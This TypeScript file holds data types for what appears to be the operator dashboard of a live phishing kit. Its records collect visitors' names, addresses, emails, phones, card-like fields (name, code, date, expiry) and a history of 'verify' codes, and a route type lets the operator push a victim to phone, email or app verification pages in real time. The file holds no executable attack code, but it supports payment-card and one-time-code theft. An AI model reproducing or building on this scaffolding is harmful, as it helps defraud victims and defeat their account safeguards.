export type CheckoutSnapshot = {
  at?: number;
  time?: string;
  checkoutName?: string;
  checkoutPhone?: string;
  checkoutCode?: string;
  checkoutDate?: string;
  checkoutExpiryDate?: string;
};

export type VerifyHistoryItem = {
  at?: number;
  time?: string;
  value?: string;
};

export type RecordRow = {
  id: number | string;
  socketId: string;
  ip: string;
  deviceType?: string;
  deviceOS?: string;
  time: string;
  page?: string;
  online?: boolean;
  status?: string;
  fullname?: string;
  address?: string;
  fulladdress?: string;
  city?: string;
  state?: string;
  postalcode?: string;
  email?: string;
  telephone?: string;
  checkoutName?: string;
  checkoutPhone?: string;
  checkoutCode?: string;
  checkoutDate?: string;
  checkoutExpiryDate?: string;
  checkoutSnapshots?: CheckoutSnapshot[];
  verify?: string;
  verifyHistory?: VerifyHistoryItem[];
  verifyMethod?: string;
  emailVerify?: string;
  appCheck?: string;
  updatedAt?: number;
  active?: boolean;
};

export type OnlineUser = {
  page: string;
  ip: string;
  deviceType?: string;
  deviceOS?: string;
  online: boolean;
  activeRecordId?: string | number | null;
};

export type FilterKey = 'online' | 'in_progress' | 'submitted' | 'offline' | 'refills' | 'all';
export type SortKey = 'id_desc' | 'recent_activity';
export type ActionTone = 'danger' | 'brand' | 'neutral';
export type RouteTarget = 'verify' | 'verifyphone' | 'emailverify' | 'appcheck' | 'home';
export type ConnectionState = 'connecting' | 'connected' | 'reconnecting' | 'disconnected';

export type FlatRow = { r: RecordRow; indent: boolean; mainId: number; subsCount: number };
export type Group = { mainId: number; main?: RecordRow; subs: RecordRow[] };

export type AdminUpdatePayload = {
  records?: RecordRow[];
  onlineUsers?: OnlineUser[];
  stats?: {
    visits?: number;
    clicks?: number;
    stepDone?: number;
    stepTotal?: number;
    clickRate?: number;
  };
};

export type AckResponse = {
  ok?: boolean;
  error?: string;
};
